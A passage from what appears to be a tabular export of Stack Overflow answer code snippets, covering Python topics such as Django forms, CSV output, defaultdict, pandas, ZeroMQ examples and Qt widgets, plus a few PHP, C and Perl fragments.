</snippet></ROW><ROW><id>20427845</id><snippet>RadioSelect</snippet></ROW><ROW><id>20427845</id><snippet>widget</snippet></ROW><ROW><id>20427845</id><snippet>denomination = forms.ModelChoiceField(queryset=Denomination.objects.all(), widget=forms.RadioSelect)
</snippet></ROW><ROW><id>20427845</id><snippet>class GiftCardForm(forms.ModelForm):
    class Meta:
        model = Gift_Card
        widgets = {'denomination': forms.RadioSelect}
</snippet></ROW><ROW><id>20427948</id><snippet>import csv
from operator import itemgetter


with open(outputfile, 'wb') as outf:
    writer = None  # will be set to a csv.DictWriter later

    for key, item in sorted(data.items(), key=itemgetter(0)):
        row = {}
        nested_name, nested_items = '', {}
        for k, v in item.items():
            if not isinstance(v, dict):
                row[k] = v
            else:
                assert not nested_items, 'Only one nested structure is supported'
                nested_name, nested_items = k, v

        if writer is None:
            # build fields for each first key of each nested item first
            fields = sorted(row)

            # sorted keys of first item in key sorted order
            nested_keys = sorted(sorted(nested_items.items(), key=itemgetter(0))[0][1])
            fields.extend('__'.join((nested_name, k)) for k in nested_keys)

            writer = csv.DictWriter(outf, fields)
            writer.writeheader()

        for nkey, nitem in sorted(nested_items.items(), key=itemgetter(0)):
            row.update(('__'.join((nested_name, k)), v) for k, v in nitem.items())
            writer.writerow(row)
</snippet></ROW><ROW><id>20427948</id><snippet>COUNTRY,ITW,VENUE,RACES__NO,RACES__TIME
HAE,XAD,JOEBURG,1,12:35
HAE,XAD,JOEBURG,2,13:10
HAE,XAD,JOEBURG,3,13:40
HAE,XAD,JOEBURG,4,14:10
HAE,XAD,JOEBURG,5,14:55
HAE,XAD,JOEBURG,6,15:30
HAE,XAD,JOEBURG,7,16:05
HAE,XAD,JOEBURG,8,16:40
ABA,XAD,FOOBURG,1,12:35
ABA,XAD,FOOBURG,2,13:10
ABA,XAD,FOOBURG,3,13:40
ABA,XAD,FOOBURG,4,14:10
ABA,XAD,FOOBURG,5,14:55
ABA,XAD,FOOBURG,6,15:30
ABA,XAD,FOOBURG,7,16:05
ABA,XAD,FOOBURG,8,16:40
</snippet></ROW><ROW><id>20427979</id><snippet>random.shuffle</snippet></ROW><ROW><id>20427979</id><snippet>print</snippet></ROW><ROW><id>20427979</id><snippet>random.shuffle</snippet></ROW><ROW><id>20427979</id><snippet>import random
things = [ 'spam', 'eggs', 'beans' ]
for repeat in range(10):   # exactly the same *code* will run 10 times...
    print('the first item is ' + things[0])
    print('the second item is ' + things[1])
    print('the third item is ' + things[2])
    random.shuffle(things) # ... but with a different outcome each time
</snippet></ROW><ROW><id>20428017</id><snippet>dogpile.cache</snippet></ROW><ROW><id>20428017</id><snippet>dogpile.cache</snippet></ROW><ROW><id>20428502</id><snippet>item = ListCtrl_name.GetItem(instance_location_dictionary [item_name])
ListCtrl_name.Select(item.GetId())
</snippet></ROW><ROW><id>20428703</id><snippet>dict</snippet></ROW><ROW><id>20428703</id><snippet>&gt;&gt;&gt; a
defaultdict(&lt;type 'list'&gt;, {'1': ['b', 'a'], '3': ['b'], '2': ['a']})
&gt;&gt;&gt; dict(a)
{'1': ['b', 'a'], '3': ['b'], '2': ['a']}
</snippet></ROW><ROW><id>20428703</id><snippet>&gt;&gt;&gt; isinstance(a, dict)
True
</snippet></ROW><ROW><id>20428703</id><snippet>KeyError</snippet></ROW><ROW><id>20428703</id><snippet>default_factory</snippet></ROW><ROW><id>20428703</id><snippet>&gt;&gt;&gt; a.default_factory
&lt;type 'list'&gt;
</snippet></ROW><ROW><id>20428703</id><snippet>print a</snippet></ROW><ROW><id>20428703</id><snippet>default_factory</snippet></ROW><ROW><id>20428703</id><snippet>&gt;&gt;&gt; a.default_factory = None
&gt;&gt;&gt; a[4].append(10)
Traceback (most recent call last):
  File "&lt;ipython-input-6-0721ca19bee1&gt;", line 1, in &lt;module&gt;
    a[4].append(10)
KeyError: 4
</snippet></ROW><ROW><id>20428704</id><snippet>messages = ([msg['created_at'], msg['txt'], msg['user']['id']] for msg in js['statuses'])
</snippet></ROW><ROW><id>20428704</id><snippet>in js['statuses']</snippet></ROW><ROW><id>20428704</id><snippet>in js.get('statuses', [])</snippet></ROW><ROW><id>20428723</id><snippet>itertools.product()</snippet></ROW><ROW><id>20428723</id><snippet>all()</snippet></ROW><ROW><id>20428723</id><snippet>sum()</snippet></ROW><ROW><id>20428723</id><snippet>from itertools import product

def count_squares(A):
    width, height = len(A[0]), len(A)
    indices = product(range(width - 1), range(height - 1))
    is_square = lambda x, y: all(A[a][b] == 1 for a, b in product((x, x + 1), (y, y + 1)))
    return sum(1 for x, y in indices if is_square(x, y))
</snippet></ROW><ROW><id>20428723</id><snippet>&gt;&gt;&gt; from itertools import product
&gt;&gt;&gt; count_squares([[1,1],[1,1]])
&gt;&gt;&gt; def count_squares(A):
...     width, height = len(A[0]), len(A)
...     indices = product(range(width - 1), range(height - 1))
...     is_square = lambda x, y: all(A[a][b] == 1 for a, b in product((x, x + 1), (y, y + 1)))
...     return sum(1 for x, y in indices if is_square(x, y))
... 
&gt;&gt;&gt; count_squares([[1,1],[1,1]])
1
&gt;&gt;&gt; count_squares([[1, 1, 0, 1] , [1, 1, 1, 1], [1, 1, 1, 0], [0, 1, 1, 1]])
4
</snippet></ROW><ROW><id>20428786</id><snippet>store = pd.HDFStore('file.h5',mode='w')
for chunk in read_csv('file.csv',chunsize=50000):
         store.append('df',chunk)
store.close()
</snippet></ROW><ROW><id>20428786</id><snippet>int64</snippet></ROW><ROW><id>20428786</id><snippet>float64</snippet></ROW><ROW><id>20428786</id><snippet>dtype</snippet></ROW><ROW><id>20428786</id><snippet>read_csv</snippet></ROW><ROW><id>20428836</id><snippet>&gt;&gt;&gt; import selenium
&gt;&gt;&gt; selenium.__version__
'2.37.2'
</snippet></ROW><ROW><id>20428836</id><snippet>$ python -c "import selenium; print(selenium.__version__)"
2.37.2
</snippet></ROW><ROW><id>20428961</id><snippet>dp1 = [0] * 1000
dp3 = [0] * 1000
dp5 = [0] * 1000
dp7 = [0] * 1000
</snippet></ROW><ROW><id>20428961</id><snippet>.append()</snippet></ROW><ROW><id>20428961</id><snippet>dp1 = [0, 1]
dp3 = [0, 1]
dp5 = [0, 1]
dp7 = [0, 1]

for i in xrange(2, 10001):
    dp1.append(dp3[i - 1])
    dp5.append(dp7[i - 1])
    dp3.append(dp1[i - 1] + dp5[i - 1])
    dp7.append(dp5[i - 1] + dp3[i - 1])

t = input()
for _ in xrange(int(t)):
    n = int(raw_input())
    print dp1[n] + dp3[n] + dp5[n] + dp7[n]
</snippet></ROW><ROW><id>20428961</id><snippet>for</snippet></ROW><ROW><id>20428961</id><snippet>xrange()</snippet></ROW><ROW><id>20428961</id><snippet>while</snippet></ROW><ROW><id>20428961</id><snippet>i</snippet></ROW><ROW><id>20428961</id><snippet>t</snippet></ROW><ROW><id>20429069</id><snippet>sendmail</snippet></ROW><ROW><id>20429069</id><snippet>subject</snippet></ROW><ROW><id>20429069</id><snippet>args, kwargs = self.myclass.sendmail.call_args
self.assertEqual(kwargs['subject'], "Hello World")
</snippet></ROW><ROW><id>20429069</id><snippet>sendmail</snippet></ROW><ROW><id>20429069</id><snippet>subject</snippet></ROW><ROW><id>20429069</id><snippet>args, kwargs = self.myclass.sendmail.call_args
self.assertTrue("Hello World" in args)
</snippet></ROW><ROW><id>20429069</id><snippet>sendmail</snippet></ROW><ROW><id>20429069</id><snippet>sendmail</snippet></ROW><ROW><id>20429142</id><snippet>print()</snippet></ROW><ROW><id>20429142</id><snippet>print("The answer is:", AddAnswer)
</snippet></ROW><ROW><id>20429142</id><snippet>print("The answer is:", MulAnswer)
</snippet></ROW><ROW><id>20429142</id><snippet>print()</snippet></ROW><ROW><id>20429142</id><snippet>AAnswer = Add1 + " " + "+" + " " + Add2 + " " + "=",AddAnswer
print(AAnswer)
</snippet></ROW><ROW><id>20429142</id><snippet>+</snippet></ROW><ROW><id>20429142</id><snippet>print(Add1, '+', Add2, '=', AddAnswer)
</snippet></ROW><ROW><id>20429393</id><snippet>&lt;?php
/*
*  Hello World server
*  Binds REP socket to tcp://*:5555
*  Expects "Hello" from client, replies with "World"
* @author Ian Barber &lt;ian(dot)barber(at)gmail(dot)com&gt;
*/

$context = new ZMQContext(1);

//  Socket to talk to clients
$responder = new ZMQSocket($context, ZMQ::SOCKET_REP);
$responder-&gt;bind("tcp://*:5555");

while (true) {
    //  Wait for next request from client
    $request = $responder-&gt;recv();
    printf ("Received request: [%s]\n", $request);

    //  Do some 'work'
    sleep (1);

    //  Send reply back to client
    $responder-&gt;send("World");
}
</snippet></ROW><ROW><id>20429393</id><snippet>#
#   Hello World client in Python
#   Connects REQ socket to tcp://localhost:5555
#   Sends "Hello" to server, expects "World" back
#
import zmq

context = zmq.Context()

#  Socket to talk to server
print "Connecting to hello world server…"
socket = context.socket(zmq.REQ)
socket.connect("tcp://localhost:5555")

#  Do 10 requests, waiting each time for a response
for request in range(10):
    print "Sending request %s …" % request
    socket.send("Hello")

    #  Get the reply.
    message = socket.recv()
    print "Received reply %s [ %s ]" % (request, message)
</snippet></ROW><ROW><id>20429414</id><snippet>from re import sub
with open("/path/to/file") as myfile:
    lines = []
    for line in myfile:
        line = sub('punctacros="Tasla"(_.*)', r'TROGA\1', line)
        lines.append(line)
with open("/path/to/file", "w") as myfile:
    myfile.writelines(lines)
</snippet></ROW><ROW><id>20429414</id><snippet>TROGA_TONTA  
TROGA_SONTA  
TROGA_JONTA  
TROGA_BONTA
</snippet></ROW><ROW><id>20429414</id><snippet>re.sub</snippet></ROW><ROW><id>20429414</id><snippet>line = "TROGA_"+line.split("_", 1)[1]
</snippet></ROW><ROW><id>20429552</id><snippet>ln -s /actual/path/to/file /expected/path/to/file
</snippet></ROW><ROW><id>20429552</id><snippet>link</snippet></ROW><ROW><id>20429552</id><snippet>symbolic</snippet></ROW><ROW><id>20429552</id><snippet>target</snippet></ROW><ROW><id>20429552</id><snippet>symbolic</snippet></ROW><ROW><id>20429659</id><snippet>defaultdict</snippet></ROW><ROW><id>20429659</id><snippet>def __init__(self, ...):
    self.DES = {}

def foo(self, ...):
    self.DES[id_] = "\t".join(tmp[:7])
</snippet></ROW><ROW><id>20429659</id><snippet>new</snippet></ROW><ROW><id>20429659</id><snippet>__new__</snippet></ROW><ROW><id>20429659</id><snippet>def __new__(cls):
    self = object.__new__(cls)
    return self
</snippet></ROW><ROW><id>20429659</id><snippet>bless</snippet></ROW><ROW><id>20429659</id><snippet>self.__class__</snippet></ROW><ROW><id>20429659</id><snippet>object.__new__</snippet></ROW><ROW><id>20429659</id><snippet>=~</snippet></ROW><ROW><id>20429659</id><snippet>pattern.search</snippet></ROW><ROW><id>20429659</id><snippet>re.X</snippet></ROW><ROW><id>20429659</id><snippet>/x</snippet></ROW><ROW><id>20429659</id><snippet>perlre</snippet></ROW><ROW><id>20429687</id><snippet>import sys

def run_pdb_hook(*args, **kwargs):
    import pdb, traceback
    traceback.print_exception(*args, **kwargs)
    pdb.pm()

if debug:
    sys.excepthook = run_pdb_hook
</snippet></ROW><ROW><id>20430025</id><snippet>import sqlite3
con = sqlite3.connect(":memory:")
con.isolation_level = None
cur = con.cursor()
cur.execute('''CREATE TABLE ipaddr (ip text, val text )''')

from subprocess import Popen, PIPE

for ip in [ '173.194.43.34', '17.172.224.47', '198.252.206.16' ]:
    pipe = Popen('host {}'.format( ip ), shell=True, stdout=PIPE )
    for line in pipe.stdout:
        cur.execute ( "INSERT INTO ipaddr VALUES ('{}','{}')".format( ip, line.strip( ) ))
</snippet></ROW><ROW><id>20430025</id><snippet>cur.execute( 'SELECT * FROM ipaddr' ).fetchall( )
</snippet></ROW><ROW><id>20430048</id><snippet>instance</snippet></ROW><ROW><id>20430048</id><snippet>request.POST</snippet></ROW><ROW><id>20430048</id><snippet>s = Supplier()
supplier_form = SupplierNewForm(instance=s) 
</snippet></ROW><ROW><id>20430048</id><snippet>supplier_form = SupplierNewForm()
</snippet></ROW><ROW><id>20430048</id><snippet>def SupplierNew(request):
    if request.method == "POST":
        ## Save post data

    else:
        supplier_form = SupplierNewForm()

    return render(request, "supplier_new.html", {
            'supplier_form' : supplier_form,
    })
</snippet></ROW><ROW><id>20430048</id><snippet>else</snippet></ROW><ROW><id>20430136</id><snippet>groupby/apply</snippet></ROW><ROW><id>20430136</id><snippet>&gt;&gt;&gt; grouped = df.groupby('one')
&gt;&gt;&gt; grouped.apply(lambda x: x.index[0])
one
1     2013-12-06 00:00:01.200000
2     2013-12-06 00:00:03.200000
3     2013-12-06 00:00:04.200000
dtype: datetime64[ns]
</snippet></ROW><ROW><id>20430136</id><snippet>df_2 = df['two'].groupby(df['one']).first()
</snippet></ROW><ROW><id>20430136</id><snippet>&gt;&gt;&gt; grouped['two'].first()
one
1      1
2      1
3      5
Name: two, dtype: int64
</snippet></ROW><ROW><id>20430294</id><snippet>route</snippet></ROW><ROW><id>20430294</id><snippet>funcs.py</snippet></ROW><ROW><id>20430294</id><snippet>from bottle import template, request, Bottle

def index(something=''):
    return template('printer/index', message='')

def printer(something=''):
    if request.method == 'POST':
        from project.models.Printer import Printer
        printer = Printer()
        message = printer.show_string(request.forms.get('text'))
        return template('printer/index', message=message)
    return template('printer/print', message='')
</snippet></ROW><ROW><id>20430294</id><snippet>import bottle
import funcs

app = bottle.Bottle()

app.route('/', method='GET', callback=funcs.index)
app.route('/print', method=['GET', 'POST'], callback=funcs.printer)

app.run(host='127.0.0.1', port=8080)
</snippet></ROW><ROW><id>20430294</id><snippet>python routes.py</snippet></ROW><ROW><id>20430294</id><snippet>% 12:44:32 ~/&gt;curl http://127.0.0.1:8080/print
    &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
    &lt;html&gt;
        &lt;head&gt;
            &lt;title&gt;Error: 500 Internal Server Error&lt;/title&gt;
            ...
        &lt;/head&gt;
        &lt;body&gt;
            &lt;h1&gt;Error: 500 Internal Server Error&lt;/h1&gt;
            &lt;p&gt;Sorry, the requested URL &lt;tt&gt;'http://127.0.0.1:8080/print'&lt;/tt&gt;
               caused an error:&lt;/p&gt;
            &lt;pre&gt;Template 'printer/print' not found.&lt;/pre&gt;
        &lt;/body&gt;
    &lt;/html&gt;
</snippet></ROW><ROW><id>20430294</id><snippet>funcs.printer()</snippet></ROW><ROW><id>20430338</id><snippet>def scene_unit_linear(val):
     _IN_CM = {'m':100, 'in':2.54, 'cm':1, 'ft':30.48}
     _scale = _IN_CM[cmds.currentUnit(q=True, l=True)]
     return _scale * val
</snippet></ROW><ROW><id>20430338</id><snippet>   def scene_unit_area(val):
     _IN_CM = {'m':100, 'in':2.54, 'cm':1, 'ft':30.48}
     _scale = _IN_CM[cmds.currentUnit(q=True, l=True)]
     return _scale * _scale * val


world_area = scene_unit_area(face.getArea(space = "world"))
</snippet></ROW><ROW><id>20430407</id><snippet>sudo apt-get install libxslt1-dev
</snippet></ROW><ROW><id>20430407</id><snippet>virtualenv</snippet></ROW><ROW><id>20430407</id><snippet># with your virtual environment activated
pip install --upgrade lxml
pip install cssselect   # cssselect has been spun-off into its own project
</snippet></ROW><ROW><id>20430407</id><snippet>virtualenv</snippet></ROW><ROW><id>20430407</id><snippet>sudo apt-get remove python-lxml
</snippet></ROW><ROW><id>20430407</id><snippet>lxml</snippet></ROW><ROW><id>20430407</id><snippet>sudo pip install --upgrade lxml
sudo pip install cssselect
</snippet></ROW><ROW><id>20430407</id><snippet>ValueError</snippet></ROW><ROW><id>20430407</id><snippet>pip</snippet></ROW><ROW><id>20430407</id><snippet>pip</snippet></ROW><ROW><id>20430407</id><snippet>pip</snippet></ROW><ROW><id>20430407</id><snippet>pip</snippet></ROW><ROW><id>20430407</id><snippet>import sys; print(sys.executable)
</snippet></ROW><ROW><id>20430407</id><snippet>/usr/local/bin/python2.6
</snippet></ROW><ROW><id>20430407</id><snippet>/usr/local/bin/pip</snippet></ROW><ROW><id>20430407</id><snippet>sudo /usr/local/bin/pip install --upgrade lxml
sudo /usr/local/bin/pip install cssselect
</snippet></ROW><ROW><id>20430407</id><snippet>In [38]: import lxml.etree as ET

In [44]: ET.__version__
Out[44]: u'3.2.0'

In [45]: ET.LIBXML_COMPILED_VERSION
Out[46]: (2, 7, 8)

In [47]: ET.LIBXSLT_COMPILED_VERSION
Out[48]: (1, 1, 26)    
</snippet></ROW><ROW><id>20430407</id><snippet>In [57]: import lxml.etree as ET

In [58]: ET
Out[58]: &lt;module 'lxml.etree' from '/home/unutbu/.virtualenvs/dev/lib/python2.7/site-packages/lxml/etree.so'&gt;
</snippet></ROW><ROW><id>20430520</id><snippet>~$ python
Python 2.7.4 (default, Apr 19 2013, 18:28:01) 
[GCC 4.7.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; from something import yourfunc
&gt;&gt;&gt; yourfunc(a,b,c,d)
</snippet></ROW><ROW><id>20430520</id><snippet>def funcA(): return 'A'
def twice(n): return 2 * n
def swap(a, b): return b, a
</snippet></ROW><ROW><id>20430520</id><snippet>~/stackoverflow</snippet></ROW><ROW><id>20430520</id><snippet>~/stackoverflow$ python
Python 2.7.4 (default, Apr 19 2013, 18:28:01) 
[GCC 4.7.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; from something import twice, swap
&gt;&gt;&gt; twice(24)
48
&gt;&gt;&gt; swap(1,2)
(2, 1)
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20430520</id><snippet>python2.7</snippet></ROW><ROW><id>20430520</id><snippet>python3.3</snippet></ROW><ROW><id>20430520</id><snippet>python3.4</snippet></ROW><ROW><id>20430520</id><snippet>(/usr/bin/)python</snippet></ROW><ROW><id>20430520</id><snippet>python2.7</snippet></ROW><ROW><id>20430520</id><snippet>(/usr/bin/)python3</snippet></ROW><ROW><id>20430520</id><snippet>python3.3</snippet></ROW><ROW><id>20430531</id><snippet>&gt;&gt;&gt; prices.mean(axis=0)
0    0.109854
1   -0.011218
2   -0.020591
dtype: float64
&gt;&gt;&gt; type(prices.mean(axis=0))
&lt;class 'pandas.core.series.Series'&gt;
</snippet></ROW><ROW><id>20430531</id><snippet>price_means = pd.DataFrame(prices.mean(axis=0))
</snippet></ROW><ROW><id>20430720</id><snippet>object</snippet></ROW><ROW><id>20430720</id><snippet>class U32(object):
</snippet></ROW><ROW><id>20430720</id><snippet>__div__</snippet></ROW><ROW><id>20430720</id><snippet>U32</snippet></ROW><ROW><id>20430720</id><snippet>U32</snippet></ROW><ROW><id>20430720</id><snippet>__getattr__</snippet></ROW><ROW><id>20430720</id><snippet>__getattr__</snippet></ROW><ROW><id>20430720</id><snippet>__getattribute__</snippet></ROW><ROW><id>20430720</id><snippet>__getattribute__()</snippet></ROW><ROW><id>20430720</id><snippet>__getattribute__()</snippet></ROW><ROW><id>20430720</id><snippet>def _build_delegate(name, attr, cls, type_):
    def f(*args, **kwargs):
        args = tuple(a if not isinstance(a, cls) else a.int_ for a in args)
        ret = attr(*args, **kwargs)
        if not isinstance(ret, type_) or name == '__hash__':
            return ret
        return cls(ret)
    return f

def delegated_special_methods(type_):
    def decorator(cls):
        for name, value in vars(type_).items():
            if (name[:2], name[-2:]) != ('__', '__') or not callable(value):
                continue
            if hasattr(cls, name) and not name in ('__repr__', '__hash__'):
                continue
            setattr(cls, name, _build_delegate(name, value, cls, type_))
        return cls
    return decorator

@delegated_special_methods(int)
class U32(object):
    def __init__(self, num=0, base=None):
        """Creates the U32 object.

        Args:
            num: the integer/string to use as the initial state
            base: the base of the integer use if the num given was a string
        """
        if base is None:
            self.int_ = int(num) % 2**32
        else:
            self.int_ = int(num, base) % 2**32
    def __coerce__(self, ignored):
        return None
    def __str__(self):
        return "&lt;U32 instance at 0x%x, int=%d&gt;" % (id(self), self.int_)
</snippet></ROW><ROW><id>20430720</id><snippet>int</snippet></ROW><ROW><id>20430792</id><snippet>examples/itemviews</snippet></ROW><ROW><id>20430792</id><snippet>sources/pyside-examples/examples/itemviews</snippet></ROW><ROW><id>20430792</id><snippet>import sip
sip.setapi('QString', 2)

from xml.etree import cElementTree as etree
from PyQt4 import QtGui, QtCore

class Window(QtGui.QWidget):
    def __init__(self, xml):
        QtGui.QWidget.__init__(self)
        self.tree = QtGui.QTreeWidget(self)
        self.tree.header().hide()
        self.importTree(xml)
        self.button = QtGui.QPushButton('Export', self)
        self.button.clicked[()].connect(self.exportTree)
        layout = QtGui.QVBoxLayout(self)
        layout.addWidget(self.tree)
        layout.addWidget(self.button)

    def importTree(self, xml):
        def build(item, root):
            for element in root.getchildren():
                child = QtGui.QTreeWidgetItem(
                    item, [element.attrib['text']])
                child.setFlags(
                    child.flags() | QtCore.Qt.ItemIsEditable)
                build(child, element)
            item.setExpanded(True)
        root = etree.fromstring(xml)
        build(self.tree.invisibleRootItem(), root)

    def exportTree(self):
        def build(item, root):
            for row in range(item.childCount()):
                child = item.child(row)
                element = etree.SubElement(
                    root, 'node', text=child.text(0))
                build(child, element)
        root = etree.Element('root')
        build(self.tree.invisibleRootItem(), root)
        from xml.dom import minidom
        print(minidom.parseString(etree.tostring(root)).toprettyxml())

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    window = Window("""\
&lt;?xml version="1.0" ?&gt;
&lt;root&gt;
    &lt;node text="Child (0)"&gt;
        &lt;node text="Child (0)"&gt;
            &lt;node text="Child (0)"/&gt;
            &lt;node text="Child (1)"/&gt;
        &lt;/node&gt;
        &lt;node text="Child (1)"&gt;
            &lt;node text="Child (0)"/&gt;
            &lt;node text="Child (1)"/&gt;
        &lt;/node&gt;
    &lt;/node&gt;
    &lt;node text="Child (1)"&gt;
        &lt;node text="Child (0)"&gt;
            &lt;node text="Child (0)"/&gt;
            &lt;node text="Child (1)"/&gt;
        &lt;/node&gt;
        &lt;node text="Child (1)"&gt;
            &lt;node text="Child (0)"/&gt;
            &lt;node text="Child (1)"/&gt;
        &lt;/node&gt;
    &lt;/node&gt;
&lt;/root&gt;
        """)
    window.setGeometry(800, 300, 300, 300)
    window.show()
    sys.exit(app.exec_())
</snippet></ROW><ROW><id>20430992</id><snippet>main()</snippet></ROW><ROW><id>20430992</id><snippet>printf</snippet></ROW><ROW><id>20430992</id><snippet>while</snippet></ROW><ROW><id>20430992</id><snippet>printf("Ioctl Number: (int)%d  (hex)%x\n", SSD1289_GET_KEYS, SSD1289_GET_KEYS);

while(1)
    get_keys(fd);
</snippet></ROW><ROW><id>20430992</id><snippet>_IOR</snippet></ROW><ROW><id>20430992</id><snippet>sys/ioctl.h</snippet></ROW><ROW><id>20430992</id><snippet>#define _IOC(inout,group,num,len) \
    (inout | ((len &amp; IOCPARM_MASK) &lt;&lt; 16) | ((group) &lt;&lt; 8) | (num))
#define _IO(g,n)    _IOC(IOC_VOID,  (g), (n), 0)
#define _IOR(g,n,t) _IOC(IOC_OUT,   (g), (n), sizeof(t))
#define _IOW(g,n,t) _IOC(IOC_IN,    (g), (n), sizeof(t))
</snippet></ROW><ROW><id>20430992</id><snippet>cc -E</snippet></ROW><ROW><id>20430992</id><snippet>get_keys</snippet></ROW><ROW><id>20430992</id><snippet>((__uint32_t)0x40000000 | ((sizeof(unsigned char *) &amp; 0x1fff) &lt;&lt; 16) | ((('keys')) &lt;&lt; 8) | ((1)))
</snippet></ROW><ROW><id>20430992</id><snippet>main()</snippet></ROW><ROW><id>20430992</id><snippet>printf("%d", ((__uint32_t)0x40000000 | ((sizeof(unsigned char *) &amp; 0x1fff) &lt;&lt; 16) | 
               ((('keys')) &lt;&lt; 8) | ((1))));
exit(0);
</snippet></ROW><ROW><id>20430992</id><snippet>1702458113</snippet></ROW><ROW><id>20430992</id><snippet>printf</snippet></ROW><ROW><id>20430992</id><snippet>while</snippet></ROW><ROW><id>20431024</id><snippet>import numpy
</snippet></ROW><ROW><id>20431024</id><snippet>for line in input:
    lst = line.strip().split(' ')
    if not lst: break
    w.append(int(lst[0]))
</snippet></ROW><ROW><id>20431103</id><snippet>class SomeClass:
    def some_function(self, foo): pass
</snippet></ROW><ROW><id>20431103</id><snippet>some_instance = SomeClass()
some_instance.some_function(foo)
</snippet></ROW><ROW><id>20431148</id><snippet>collections.defaultdict</snippet></ROW><ROW><id>20431148</id><snippet>&gt;&gt;&gt; a = np.array([('php', 'image-processing', 'file-upload', 'upload', 'mime-types'),
       ('firefox',), 
       ('r', 'matlab', 'machine-learning'),
       ('c#', 'url', 'encoding'), 
       ('php', 'api', 'file-get-contents'),
       ('proxy', 'active-directory', 'jmeter'), 
       ('core-plot',),
       ('c#', 'asp.net', 'windows-phone-7'),
       ('.net', 'javascript', 'code-generation'),
       ('sql', 'variables', 'parameters', 'procedure', 'calls')], dtype=object)

&gt;&gt;&gt; from collections import defaultdict
&gt;&gt;&gt; d = defaultdict(list)
&gt;&gt;&gt; for i, x in enumerate(a):
...     for k in x:
...         d[k].append(i)
...         
&gt;&gt;&gt; d['php']
[0, 4]
</snippet></ROW><ROW><id>20431335</id><snippet>items</snippet></ROW><ROW><id>20431335</id><snippet>&gt;&gt;&gt; from collections import OrderedDict
&gt;&gt;&gt; dct = OrderedDict([(73, 'Mocha My Day'), (77, 'Coffee Cafe'), (83, 'Flavour Fusion'), (85, 'Mexican Grill')])
&gt;&gt;&gt; dct.items()
[(73, 'Mocha My Day'), (77, 'Coffee Cafe'), (83, 'Flavour Fusion'), (85, 'Mexican Grill')]
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20431335</id><snippet>list</snippet></ROW><ROW><id>20431335</id><snippet>&gt;&gt;&gt; from collections import OrderedDict
&gt;&gt;&gt; dct = OrderedDict([(73, 'Mocha My Day'), (77, 'Coffee Cafe'), (83, 'Flavour Fusion'), (85, 'Mexican Grill')])
&gt;&gt;&gt; list(dct.items())
[(73, 'Mocha My Day'), (77, 'Coffee Cafe'), (83, 'Flavour Fusion'), (85, 'Mexican Grill')]
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20431341</id><snippet>000000 to 999999</snippet></ROW><ROW><id>20431341</id><snippet>Microseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds. Example: 654321</snippet></ROW><ROW><id>20431341</id><snippet>microseconds</snippet></ROW><ROW><id>20431365</id><snippet>keyPressEvent</snippet></ROW><ROW><id>20431365</id><snippet>True</snippet></ROW><ROW><id>20431365</id><snippet>False</snippet></ROW><ROW><id>20431365</id><snippet>from PySide import QtCore, QtGui

class Window(QtGui.QWidget):
    def __init__(self):
        QtGui.QWidget.__init__(self)
        self.edit = QtGui.QTextEdit(self)
        self.edit.installEventFilter(self)
        layout = QtGui.QVBoxLayout(self)
        layout.addWidget(self.edit)

    def eventFilter(self, widget, event):
        if (event.type() == QtCore.QEvent.KeyPress and
            widget is self.edit):
            key = event.key()
            if key == QtCore.Qt.Key_Escape:
                print('escape')
            else:
                if key == QtCore.Qt.Key_Return:
                    self.edit.setText('return')
                elif key == QtCore.Qt.Key_Enter:
                    self.edit.setText('enter')
                return True
        return QtGui.QWidget.eventFilter(self, widget, event)

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    window = Window()
    window.setGeometry(500, 300, 300, 300)
    window.show()
    sys.exit(app.exec_())
</snippet></ROW><ROW><id>20431638</id><snippet>use MIME::Base64;

open(my $gif, '&lt;:raw', 'yellow.gif');
local $/;
say encode_base64(&lt;$gif&gt;);
</snippet></ROW><ROW><id>20431638</id><snippet>perl -MMIME::Base64 -E "open (my $output, '&gt;:raw', $ARGV[0]); print $output decode_base64('R0lGODdhHgAeAPcAAP//AAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBmAABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNmZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZmzGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb//5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZAJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwAM8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8Amf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+ZzP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///wAAAA0NDRoaGigoKDU1NUNDQ1BQUF1dXWtra3h4eIaGhpOTk6Ghoa6urru7u8nJydbW1uTk5PHx8f///wAAAAEBAQICAgMDAwQEBAUFBQYGBgcHBwgICAkJCQoKCgsLCwwMDA0NDQ4ODg8PDxAQEBERERISEiwAAAAAHgAeAAcIMgABCBxIsKDBgwgTKlzIsKHDhxAjSpxIsaLFixgzatzIsaPHjyBDihxJsqTJkyhTngwIADs=')" yellow.gif
